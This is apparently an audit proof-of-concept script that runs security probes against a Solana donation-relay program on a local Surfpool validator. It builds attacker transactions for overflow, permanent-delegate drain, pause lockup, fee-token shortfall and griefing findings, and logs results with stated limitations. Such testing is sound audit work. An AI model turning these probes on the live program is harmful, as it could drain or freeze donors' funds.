#!/usr/bin/env python3
"""Surfpool security probes for the retained Donation Relay ELF.

Public donor/attacker transactions are signed and committed. Relayer-only calls
are unsigned simulations with sigVerify=false because the production key is not
available; they establish post-authorization behavior only. Swap cases load an
explicit test stub at the Jupiter address, never the real Jupiter program.
"""
from __future__ import annotations

import base64
import hashlib
import json
import sys
from pathlib import Path

from solders.account import Account
from solders.compute_budget import set_compute_unit_limit
from solders.instruction import AccountMeta, Instruction
from solders.keypair import Keypair
from solders.message import Message
from solders.pubkey import Pubkey
from solders.transaction import Transaction

HERE = Path(__file__).resolve().parent
ROOT = HERE.parents[2]
sys.path.insert(0, str(HERE))
from surfpool_rpc import Surfpool, original, dependency, elf_image, sha256

P = Pubkey.from_string
RELAY = P("RLAYHr9TRFcKB2ubYQhspcnXiaGpaVzNQvHytt47RZu")
RELAYER = P("RLYRf96HAJSbbXCNS6ibQYnkxtb6kbfuFxqEkm9oQUc")
TOKEN = P("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
TOKEN2022 = P("TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb")
ATA = P("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL")
SYSTEM = Pubkey.default()
WSOL = P("So11111111111111111111111111111111111111112")
SETTLEMENT = Pubkey.from_bytes(bytes([198, 250, 122, 243, 190, 219, 173, 58, 61, 101, 243, 106, 171, 201, 116, 49, 177, 187, 228, 194, 210, 246, 224, 228, 124, 166, 2, 3, 69, 47, 93, 97]))
JUPITER = Pubkey.from_bytes(bytes([4, 121, 213, 91, 242, 49, 192, 110, 238, 116, 197, 110, 206, 104, 21, 7, 253, 177, 178, 222, 163, 244, 142, 81, 2, 177, 205, 162, 86, 188, 19, 143]))
OUT = HERE / "results/relay.json"
WORK = HERE / "results/relay-work"
STUB = WORK / "relay_test_stub.so"


def key(label: str) -> Keypair:
    return Keypair.from_seed(hashlib.sha256(("relay-surfpool/" + label).encode()).digest())


def pub(label: str) -> Pubkey:
    return Pubkey.from_bytes(hashlib.sha256(("relay-surfpool-data/" + label).encode()).digest())


def disc(namespace: str, name: str) -> bytes:
    return hashlib.sha256(f"{namespace}:{name}".encode()).digest()[:8]


def pda(*seeds: bytes) -> tuple[Pubkey, int]:
    return Pubkey.find_program_address(list(seeds), RELAY)


def ata(owner: Pubkey, mint: Pubkey, token: Pubkey = TOKEN) -> Pubkey:
    return Pubkey.find_program_address([bytes(owner), bytes(token), bytes(mint)], ATA)[0]


def account(lamports: int = 10**9, data: bytes = b"", owner: Pubkey = SYSTEM) -> Account:
    return Account(lamports, data, owner)


def mint_data(supply: int = 10**19, decimals: int = 6, authority: Pubkey | None = None,
              extensions: list[tuple[int, bytes]] | None = None) -> bytes:
    data = bytearray(82)
    if authority is not None:
        data[0:4] = (1).to_bytes(4, "little")
        data[4:36] = bytes(authority)
    data[36:44] = supply.to_bytes(8, "little")
    data[44] = decimals
    data[45] = 1
    if extensions:
        data.extend(bytes(83))  # Token-2022 extension area starts after 165 base bytes.
        data.append(1)  # AccountType::Mint
        for kind, value in extensions:
            data.extend(kind.to_bytes(2, "little"))
            data.extend(len(value).to_bytes(2, "little"))
            data.extend(value)
    return bytes(data)


def token_data(mint: Pubkey, owner: Pubkey, amount: int, native: bool = False) -> bytes:
    data = bytearray(165)
    data[0:32] = bytes(mint)
    data[32:64] = bytes(owner)
    data[64:72] = amount.to_bytes(8, "little")
    data[108] = 1
    if native:
        data[109:113] = (1).to_bytes(4, "little")
        data[113:121] = (2_039_280).to_bytes(8, "little")
    return bytes(data)


def whitelist_data(mints: list[Pubkey]) -> bytes:
    bump = pda(b"mint_whitelist_v1")[1]
    body = disc("account", "MintWhitelistV1") + bytes([bump]) + len(mints).to_bytes(4, "little")
    body += b"".join(bytes(m) for m in mints)
    return body + bytes(1037 - len(body))


def transfer_checked(token: Pubkey, source: Pubkey, mint: Pubkey, destination: Pubkey,
                     authority: Pubkey, amount: int, decimals: int = 6) -> Instruction:
    return Instruction(token, bytes([12]) + amount.to_bytes(8, "little") + bytes([decimals]), [
        AccountMeta(source, False, True), AccountMeta(mint, False, False),
        AccountMeta(destination, False, True), AccountMeta(authority, True, False)])


def pause_ix(mint: Pubkey, authority: Pubkey) -> Instruction:
    return Instruction(TOKEN2022, bytes([44, 1]), [
        AccountMeta(mint, False, True), AccountMeta(authority, True, False)])


def create_ata_ix(payer: Pubkey, owner: Pubkey, mint: Pubkey, token: Pubkey = TOKEN) -> Instruction:
    return Instruction(ATA, bytes([0]), [
        AccountMeta(payer, True, True), AccountMeta(ata(owner, mint, token), False, True),
        AccountMeta(owner, False, False), AccountMeta(mint, False, False),
        AccountMeta(SYSTEM, False, False), AccountMeta(token, False, False)])


def snap(pool: Surfpool, addresses: set[Pubkey]) -> dict:
    rows = {}
    for address in sorted(addresses, key=str):
        value = pool.get_account(address)
        if value is None:
            rows[str(address)] = None
        else:
            rows[str(address)] = {k: v for k, v in value.items() if k != "data"}
            rows[str(address)]["data_len"] = len(value["data"]) // 2
    return rows


def delta(before: dict, after: dict) -> dict:
    keys = sorted(set(before) | set(after))
    return {k: {"before": before.get(k), "after": after.get(k)}
            for k in keys if before.get(k) != after.get(k)}


class Case:
    def __init__(self, name: str, *, token: Pubkey = TOKEN, mint: Pubkey | None = None,
                 mint_bytes: bytes | None = None, whitelisted: bool = False,
                 source_amount: int = 10_000_000, stub: bool = False):
        self.name = name
        self.token = token
        self.fee, self.donor, self.attacker = key("fee"), key("donor"), key("attacker")
        self.mint = mint or pub(name + "/mint")
        self.config = bytes(pub(name + "/config"))
        self.epoch, _ = pda(b"epoch_tracker_v1", self.config, bytes(self.mint))
        self.debouncer, _ = pda(b"debouncer_v1", self.config, bytes(self.mint))
        self.whitelist, _ = pda(b"mint_whitelist_v1")
        self.event, _ = pda(b"__event_authority")
        self.distribution, _ = pda(b"distribution_v1", self.config, bytes(self.mint), (0).to_bytes(16, "little"))
        self.receipt, _ = pda(b"swap_receipt_v1", bytes(self.distribution))
        self.source = ata(self.donor.pubkey(), self.mint, token)
        self.destination = ata(self.debouncer, self.mint, token)
        self.distribution_ata = ata(self.distribution, self.mint, token)
        self.attacker_source = ata(self.attacker.pubkey(), self.mint, token)
        self.attacker_destination = ata(self.attacker.pubkey(), self.mint, token)
        self.accounts = {
            self.fee.pubkey(): account(10**11), self.donor.pubkey(): account(10**11),
            self.attacker.pubkey(): account(10**11), RELAYER: account(10**11),
            self.mint: account(10**9, mint_bytes if mint_bytes is not None else mint_data(), token),
            self.source: account(source_amount + 3_000_000 if self.mint == WSOL else 3_000_000,
                                 token_data(self.mint, self.donor.pubkey(), source_amount, native=self.mint == WSOL), token),
            self.attacker_source: account(source_amount + 3_000_000 if self.mint == WSOL else 3_000_000,
                                          token_data(self.mint, self.attacker.pubkey(), source_amount, native=self.mint == WSOL), token),
            self.whitelist: account(10**9, whitelist_data([self.mint] if whitelisted else []), RELAY),
            self.epoch: account(0), self.debouncer: account(0), self.destination: account(0),
            self.event: account(0), self.distribution: account(0), self.distribution_ata: account(0),
        }
        self.stub = stub
        self.pool = None
        self.steps = []

    def __enter__(self):
        work = WORK / self.name
        self.pool = Surfpool(work, binary=HERE / "tools/surfpool").__enter__()
        self.pool.load_program(RELAY, original("donation_relay"))
        self.pool.load_program(TOKEN, dependency("spl_token"))
        self.pool.load_program(TOKEN2022, dependency("spl_token_2022"))
        self.pool.load_program(ATA, dependency("associated_token"))
        if self.stub:
            self.pool.load_program(JUPITER, STUB)
        for address, value in self.accounts.items():
            self.pool.set_account(address, value)
        return self

    def __exit__(self, typ, value, tb):
        return self.pool.__exit__(typ, value, tb)

    def watch(self, extra: set[Pubkey] | None = None) -> set[Pubkey]:
        return set(self.accounts) | {self.receipt} | (extra or set())

    def signed(self, label: str, ix: Instruction, signers: list[Keypair], extra: set[Pubkey] | None = None):
        addresses = self.watch(extra) | set(ix.accounts and [m.pubkey for m in ix.accounts])
        before = snap(self.pool, addresses)
        tx = Transaction.new_signed_with_payer([set_compute_unit_limit(1_400_000), ix],
                                               self.fee.pubkey(), [self.fee, *signers],
                                               self.pool.latest_blockhash())
        result = self.pool.send(tx)
        after = snap(self.pool, addresses)
        row = {"action": label, "mode": "signed_committed", "signature_verification": True,
               "signature": result["signature"], "error": result["error"], "logs": result["logs"],
               "state_delta": delta(before, after), "before": before, "after": after}
        self.steps.append(row)
        return row

    def privileged(self, label: str, ix: Instruction, extra: set[Pubkey] | None = None):
        addresses = self.watch(extra) | {m.pubkey for m in ix.accounts}
        before = snap(self.pool, addresses)
        tx = Transaction.new_unsigned(Message.new_with_blockhash(
            [set_compute_unit_limit(1_400_000), ix], RELAYER, self.pool.latest_blockhash()))
        result = self.pool.simulate(tx, sig_verify=False)
        after = snap(self.pool, addresses)
        row = {"action": label, "mode": "unsigned_simulation_sigVerify_false",
               "signature_verification": False, "error": result.get("err"),
               "logs": result.get("logs", []), "units_consumed": result.get("unitsConsumed"),
               "state_delta": delta(before, after), "before": before, "after": after,
               "limitation": "post-authorization behavior only; production relayer signature unavailable; no authorization bypass or committed privileged state claimed"}
        self.steps.append(row)
        return row

    def donation(self, amount: int, *, tip: int = 125) -> Instruction:
        data = (disc("global", "donate_v1") + amount.to_bytes(8, "little") + self.config
                + tip.to_bytes(2, "little") + (9).to_bytes(4, "little") + b"relay-poc"
                + bytes(self.attacker.pubkey()))
        return Instruction(RELAY, data, [
            AccountMeta(self.epoch, False, True), AccountMeta(self.debouncer, False, True),
            AccountMeta(self.destination, False, True), AccountMeta(self.mint, False, True),
            AccountMeta(self.source, False, True), AccountMeta(self.donor.pubkey(), True, True),
            AccountMeta(self.whitelist, False, False), AccountMeta(ATA, False, False),
            AccountMeta(self.token, False, False), AccountMeta(SYSTEM, False, False),
            AccountMeta(self.event, False, False), AccountMeta(RELAY, False, False)])

    def close(self) -> Instruction:
        data = disc("global", "close_donation_epoch_v1") + self.config + (0).to_bytes(16, "little")
        return Instruction(RELAY, data, [
            AccountMeta(self.distribution, False, True), AccountMeta(self.distribution_ata, False, True),
            AccountMeta(self.epoch, False, True), AccountMeta(self.debouncer, False, True),
            AccountMeta(self.destination, False, True), AccountMeta(self.mint, False, True),
            AccountMeta(self.token, False, False), AccountMeta(RELAYER, True, True),
            AccountMeta(ATA, False, False), AccountMeta(SYSTEM, False, False),
            AccountMeta(self.event, False, False), AccountMeta(RELAY, False, False)])

    def non_swap(self) -> Instruction:
        shares = bytes([0]) + bytes(self.attacker.pubkey()) + (10_000).to_bytes(2, "little")
        data = disc("global", "distribute_non_swap_output_mint_v1") + (1).to_bytes(4, "little") + shares
        recipient = ata(self.attacker.pubkey(), self.mint, self.token)
        self.pool.set_account(recipient, account(3_000_000, token_data(self.mint, self.attacker.pubkey(), 0), self.token))
        return Instruction(RELAY, data, [
            AccountMeta(self.epoch, False, False), AccountMeta(self.debouncer, False, False),
            AccountMeta(self.distribution, False, True), AccountMeta(self.distribution_ata, False, True),
            AccountMeta(self.mint, False, True), AccountMeta(RELAYER, True, True),
            AccountMeta(self.token, False, False), AccountMeta(ATA, False, False),
            AccountMeta(SYSTEM, False, False), AccountMeta(self.event, False, False),
            AccountMeta(RELAY, False, False), AccountMeta(recipient, False, True)])

    def prepare_swap(self, output_mint_authority: Pubkey | None = None):
        # The fixed settlement mint is local synthetic state with mint authority
        # assigned to the distribution PDA solely so the explicit stub can mint.
        authority = output_mint_authority or self.distribution
        self.pool.set_account(SETTLEMENT, account(10**9, mint_data(authority=authority), self.token))
        self.output_ata = ata(self.distribution, SETTLEMENT, self.token)
        self.input_sink = ata(self.attacker.pubkey(), self.mint, self.token)
        self.pool.set_account(self.input_sink, account(3_000_000, token_data(self.mint, self.attacker.pubkey(), 0), self.token))
        self.pool.set_account(self.output_ata, account(0))

    def just_swap(self, input_amount: int, output_amount: int) -> Instruction:
        self.prepare_swap()
        swap_data = input_amount.to_bytes(8, "little") + output_amount.to_bytes(8, "little") + bytes([6])
        data = disc("global", "just_swap_v1") + len(swap_data).to_bytes(4, "little") + swap_data
        metas = [
            AccountMeta(self.epoch, False, False), AccountMeta(self.debouncer, False, False),
            AccountMeta(self.distribution, False, True), AccountMeta(self.receipt, False, True),
            AccountMeta(self.distribution_ata, False, True), AccountMeta(self.output_ata, False, True),
            AccountMeta(self.mint, False, True), AccountMeta(SETTLEMENT, False, True),
            AccountMeta(self.token, False, False), AccountMeta(RELAYER, True, True),
            AccountMeta(self.token, False, False), AccountMeta(JUPITER, False, False),
            AccountMeta(ATA, False, False), AccountMeta(SYSTEM, False, False),
            AccountMeta(self.event, False, False), AccountMeta(RELAY, False, False),
            # Explicit stub CPI interface, not real Jupiter accounts.
            AccountMeta(self.token, False, False), AccountMeta(self.mint, False, False),
            AccountMeta(self.distribution_ata, False, True), AccountMeta(self.input_sink, False, True),
            AccountMeta(SETTLEMENT, False, True), AccountMeta(self.output_ata, False, True),
            AccountMeta(self.distribution, False, False),
        ]
        return Instruction(RELAY, data, metas)


def amount(row: dict, address: Pubkey, stage: str = "after") -> int | None:
    value = pool_account_data(row, address, stage)
    return None


def pool_account_data(row, address, stage):
    # State snapshots intentionally contain hashes, not token bytes. This helper
    # remains a placeholder guard against deriving balances from hash-only data.
    return None


def result(findings: list[dict], case: Case, outcome: str, summary: str, blockers: list[str] | None = None):
    loaded = {}
    for address, row in case.pool.loaded_programs.items():
        path = Path(row["path"])
        loaded[address] = {"path": str(path.relative_to(ROOT)), "file_sha256": row["sha256"],
                           "loaded_elf_sha256": hashlib.sha256(elf_image(path)).hexdigest()}
    findings.append({"outcome": outcome, "summary": summary, "case": case.name,
                     "loaded_programs": loaded, "steps": case.steps,
                     "blockers": blockers or [],
                     "authority_limitation": "All privileged simulations are post-authorization only; no full signature-verified privileged exploit is claimed.",
                     "jupiter_substitution": bool(case.stub)})


def run_m09(findings):
    rows = []
    for label, value in [("control_1e16", 10**16), ("overflow_1e18", 10**18)]:
        with Case("m09-" + label, source_amount=10**18) as c:
            row = c.signed("donation", c.donation(value), [c.donor])
            rows.append({"amount": value, "error": row["error"], "logs": row["logs"],
                         "state_delta": row["state_delta"], "mode": row["mode"]})
            if label.startswith("control"):
                assert row["error"] is None, row
            else:
                assert row["error"] is not None, row
                assert set(row["state_delta"]) <= {str(c.fee.pubkey())}, row["state_delta"]
    findings.append({"outcome": "confirmed", "summary": "Signed 10^16 donation succeeds; signed 10^18 donation with 125 bps tip fails atomically on u64 multiplication overflow.",
                     "case": "m09", "subcases": rows, "loaded_programs": LOADED, "blockers": [],
                     "authority_limitation": "none; both donor transactions are signed and committed", "jupiter_substitution": False})


def run_c01(findings):
    with Case("c01") as c:
        d = c.signed("donation", c.donation(1_000_000), [c.donor])
        assert d["error"] is None
        creation = c.signed("outsider_precreated_distribution_ata",
                            create_ata_ix(c.attacker.pubkey(), c.distribution, c.mint), [c.attacker])
        assert creation["error"] is None
        close = c.privileged("close_epoch", c.close())
        assert close["error"] is not None and not close["state_delta"]
        result(findings, c, "confirmed_post_authorization", "Signed outsider ATA precreation commits; simulated authorized close fails with IllegalOwner and leaves state unchanged.")


def run_c02(findings):
    delegate = key("permanent-delegate")
    mint = pub("c02/mint")
    mint_bytes = mint_data(extensions=[(12, bytes(delegate.pubkey()))])
    with Case("c02", token=TOKEN2022, mint=mint, mint_bytes=mint_bytes, whitelisted=True) as c:
        d = c.signed("whitelisted_donation", c.donation(1_000_000), [c.donor])
        assert d["error"] is None, d["logs"]
        drain = c.signed("permanent_delegate_transfer", transfer_checked(
            TOKEN2022, c.destination, c.mint, c.attacker_destination, delegate.pubkey(), 1_000_000), [delegate])
        assert drain["error"] is None, drain["logs"]
        result(findings, c, "confirmed_conditional", "Whitelisted Token-2022 donation commits, then the independent permanent delegate signs and commits a 1,000,000-unit transfer out of the debouncer ATA.",
               ["Requires relayer-approved whitelisted mint with an independently controlled permanent delegate; no current production mint/configuration asserted."])


def run_h07(findings):
    pause_authority = key("pause-authority")
    mint = pub("h07/mint")
    mint_bytes = mint_data(extensions=[(26, bytes(pause_authority.pubkey()) + bytes([0]))])
    with Case("h07", token=TOKEN2022, mint=mint, mint_bytes=mint_bytes) as c:
        d = c.signed("nonwhitelisted_pausable_donation", c.donation(1_000_000), [c.donor])
        assert d["error"] is None, d["logs"]
        paused = c.signed("pause_mint", pause_ix(c.mint, pause_authority.pubkey()), [pause_authority])
        assert paused["error"] is None, paused["logs"]
        close = c.privileged("close_after_pause", c.close())
        assert close["error"] is not None and not close["state_delta"]
        result(findings, c, "confirmed_post_authorization", "Non-whitelisted pausable mint is accepted by a signed donation; signed pause commits; simulated authorized close then fails and rolls back.",
               ["Requires a funded accepted mint whose independent pause authority pauses it; no current production mint asserted."])


def run_m13(findings):
    mint = pub("m13/mint")
    # TransferFeeConfig: transfer_fee_authority, withdraw_withheld_authority,
    # withheld_amount, older/newer configs (epoch, maximum_fee, basis_points).
    fee_config = bytes(72) + (0).to_bytes(8, "little") + (100_000).to_bytes(8, "little") + (1_000).to_bytes(2, "little") + (0).to_bytes(8, "little") + (100_000).to_bytes(8, "little") + (1_000).to_bytes(2, "little")
    assert len(fee_config) == 108
    with Case("m13", token=TOKEN2022, mint=mint, mint_bytes=mint_data(extensions=[(1, fee_config)]),
              whitelisted=True, stub=True) as c:
        d = c.signed("whitelisted_fee_token_donation", c.donation(1_000_000), [c.donor])
        assert d["error"] is None, d["logs"]
        close = c.privileged("close_epoch_gross_transfer", c.close())
        assert close["error"] is None, close["logs"]
        # Simulation does not commit close. Replay the same gross-transfer
        # shortfall using an explicit local post-close fixture for the CPI probe.
        dist_data = disc("account", "DistributionV1") + bytes([pda(b"distribution_v1", c.config, bytes(c.mint), (0).to_bytes(16, "little"))[1], 1])
        dist_data += c.config + bytes(c.mint) + (0).to_bytes(16, "little") + (900_000).to_bytes(8, "little")
        assert len(dist_data) == 98
        c.pool.set_account(c.distribution, account(10**9, dist_data, RELAY))
        tracker = c.pool.get_account(c.epoch)
        raw = bytearray.fromhex(tracker["data"]); raw[74:90] = (1).to_bytes(16, "little")
        c.pool.set_account(c.epoch, account(tracker["lamports"], bytes(raw), RELAY))
        c.pool.set_account(c.distribution_ata, account(3_000_000, token_data(c.mint, c.distribution, 810_000), TOKEN2022))
        swap = c.privileged("just_swap_expected_900000_actual_810000", c.just_swap(900_000, 500_000))
        assert swap["error"] is not None
        result(findings, c, "confirmed_post_authorization_with_stub", "Whitelisted 10% fee token donates net 900,000; close simulates a gross 900,000 transfer that yields 810,000; exact 900,000 stub swap then fails for insufficient funds.",
               ["Real Jupiter absent: explicit Token-CPI stub isolates Relay exact-input behavior only.", "Withheld-fee cleanup after any successful swap is not reached in this shortfall case."])


def run_c03(findings):
    with Case("c03", mint=WSOL, stub=True) as c:
        d = c.signed("wsol_donation", c.donation(1_000_000), [c.donor])
        assert d["error"] is None, d["logs"]
        close = c.privileged("close_epoch", c.close())
        assert close["error"] is None, close["logs"]
        dist_data = disc("account", "DistributionV1") + bytes([pda(b"distribution_v1", c.config, bytes(WSOL), (0).to_bytes(16, "little"))[1], 1])
        dist_data += c.config + bytes(WSOL) + (0).to_bytes(16, "little") + (1_000_000).to_bytes(8, "little")
        c.pool.set_account(c.distribution, account(10**9, dist_data, RELAY))
        tracker = c.pool.get_account(c.epoch); raw = bytearray.fromhex(tracker["data"]); raw[74:90] = (1).to_bytes(16, "little")
        c.pool.set_account(c.epoch, account(tracker["lamports"], bytes(raw), RELAY))
        c.pool.set_account(c.distribution_ata, account(4_000_000, token_data(WSOL, c.distribution, 1_000_777, native=True), TOKEN))
        swap = c.privileged("just_swap_exact_input_then_native_residual_burn", c.just_swap(1_000_000, 500_000))
        assert swap["error"] is not None
        result(findings, c, "confirmed_post_authorization_with_stub", "After signed WSOL donation and simulated close, exact 1,000,000-input stub swap leaves 777 WSOL; native Burn rejects the residual and settlement fails atomically.",
               ["Real Jupiter absent: explicit Token-CPI stub proves Relay pre/post-CPI residual behavior, not end-to-end Jupiter execution.", "Post-close state is locally replayed because privileged simulations cannot commit."])


def run_l11(findings):
    rows = []
    for label, output in [("zero_output", 0), ("one_unit_output", 1)]:
        with Case("l11-" + label, stub=True) as c:
            d = c.signed("donation", c.donation(1_000_000), [c.donor]); assert d["error"] is None
            close = c.privileged("close_epoch", c.close()); assert close["error"] is None
            dist_data = disc("account", "DistributionV1") + bytes([pda(b"distribution_v1", c.config, bytes(c.mint), (0).to_bytes(16, "little"))[1], 1])
            dist_data += c.config + bytes(c.mint) + (0).to_bytes(16, "little") + (1_000_000).to_bytes(8, "little")
            c.pool.set_account(c.distribution, account(10**9, dist_data, RELAY))
            tracker = c.pool.get_account(c.epoch); raw = bytearray.fromhex(tracker["data"]); raw[74:90] = (1).to_bytes(16, "little")
            c.pool.set_account(c.epoch, account(tracker["lamports"], bytes(raw), RELAY))
            c.pool.set_account(c.distribution_ata, account(3_000_000, token_data(c.mint, c.distribution, 1_000_000), TOKEN))
            swap = c.privileged("just_swap_" + label, c.just_swap(1_000_000, output))
            rows.append({"output": output, "error": swap["error"], "logs": swap["logs"], "mode": swap["mode"],
                         "state_delta": swap["state_delta"]})
            if output == 0: assert swap["error"] is not None
            else: assert swap["error"] is None, swap["logs"]
    findings.append({"outcome": "confirmed_defense_in_depth_not_jupiter_bypass", "summary": "Stub zero output is rejected; one-unit output is accepted with no independent Relay floor. Real Jupiter minimum-output enforcement/bypass remains untested.",
                     "case": "l11", "subcases": rows, "loaded_programs": LOADED,
                     "blockers": ["Real Jupiter absent: no claim that an encoded Jupiter minimum was bypassed.", "Privileged close/swap are unsigned post-authorization simulations."],
                     "authority_limitation": "post-authorization only", "jupiter_substitution": True})


def run_l12(findings):
    with Case("l12", mint=SETTLEMENT) as c:
        d = c.signed("donation", c.donation(1_000_000), [c.donor]); assert d["error"] is None
        stranded = c.signed("unsolicited_debouncer_credit", transfer_checked(
            TOKEN, c.attacker_source, c.mint, c.destination, c.attacker.pubkey(), 111), [c.attacker])
        assert stranded["error"] is None
        close = c.privileged("close_recorded_total_only", c.close()); assert close["error"] is None
        # Commit a local replay of the simulated close solely as the next
        # fixture state; privileged effects are not represented as committed.
        dist_data = disc("account", "DistributionV1") + bytes([pda(b"distribution_v1", c.config, bytes(c.mint), (0).to_bytes(16, "little"))[1], 1])
        dist_data += c.config + bytes(c.mint) + (0).to_bytes(16, "little") + (1_000_000).to_bytes(8, "little")
        c.pool.set_account(c.distribution, account(10**9, dist_data, RELAY))
        tracker = c.pool.get_account(c.epoch); raw = bytearray.fromhex(tracker["data"]); raw[74:90] = (1).to_bytes(16, "little")
        c.pool.set_account(c.epoch, account(tracker["lamports"], bytes(raw), RELAY))
        c.pool.set_account(c.distribution_ata, account(3_000_000, token_data(c.mint, c.distribution, 1_000_000), TOKEN))
        residual = c.signed("unsolicited_distribution_credit", transfer_checked(
            TOKEN, c.attacker_source, c.mint, c.distribution_ata, c.attacker.pubkey(), 222), [c.attacker])
        assert residual["error"] is None
        distribution = c.privileged("non_swap_distributes_recorded_and_burns_residual", c.non_swap())
        assert distribution["error"] is None, distribution["logs"]
        result(findings, c, "confirmed_post_authorization", "Signed unsolicited 111-unit debouncer credit is excluded from close; signed 222-unit distribution credit is burned by simulated non-swap settlement after the recorded 1,000,000 is distributed.",
               ["Privileged close/distribution are simulations; intermediate post-close state is explicitly replayed as a local fixture."])


LOADED = {}


def main():
    if not STUB.is_file():
        raise SystemExit(f"missing explicit test stub: {STUB}")
    pins = [original("donation_relay"), dependency("spl_token"), dependency("spl_token_2022"), dependency("associated_token"), STUB]
    for path in pins:
        LOADED[str(path.relative_to(ROOT))] = {"file_sha256": sha256(path), "loaded_elf_sha256": hashlib.sha256(elf_image(path)).hexdigest()}
    findings: dict[str, dict] = {}
    runners = [("M-09", run_m09), ("C-01", run_c01), ("C-02", run_c02),
               ("H-07", run_h07), ("M-13", run_m13), ("C-03", run_c03),
               ("L-11", run_l11), ("L-12", run_l12)]
    for ident, runner in runners:
        rows = []
        runner(rows)
        assert len(rows) == 1
        findings[ident] = {"id": ident, **rows[0]}
    report = {
        "schema": "relay-surfpool-security-v1",
        "surfpool_version": "1.6.1",
        "target": str(original("donation_relay").relative_to(ROOT)),
        "loaded_hashes": LOADED,
        "method": "offline Surfpool; signed committed donor/attacker transactions; unsigned sigVerify=false privileged simulations; explicit Token-CPI Jupiter substitution for swap isolation",
        "global_limitations": ["No production relayer private key; no privileged authorization bypass or full signature-verified privileged exploit claimed.", "No real Jupiter binary or route proof; all stub swap results isolate Relay pre/post-CPI behavior only.", "Synthetic local accounts and configuration; no current production vulnerable mint or live loss asserted."],
        "finding_count": len(findings),
        "findings": [findings[k] for k in ["L-11", "L-12", "M-09", "M-13", "H-07", "C-01", "C-02", "C-03"]],
    }
    OUT.parent.mkdir(parents=True, exist_ok=True)
    OUT.write_text(json.dumps(report, indent=2, sort_keys=True) + "\n")
    print(json.dumps({"finding_count": report["finding_count"], "outcomes": {r["id"]: r["outcome"] for r in report["findings"]}}, indent=2))


if __name__ == "__main__":
    main()
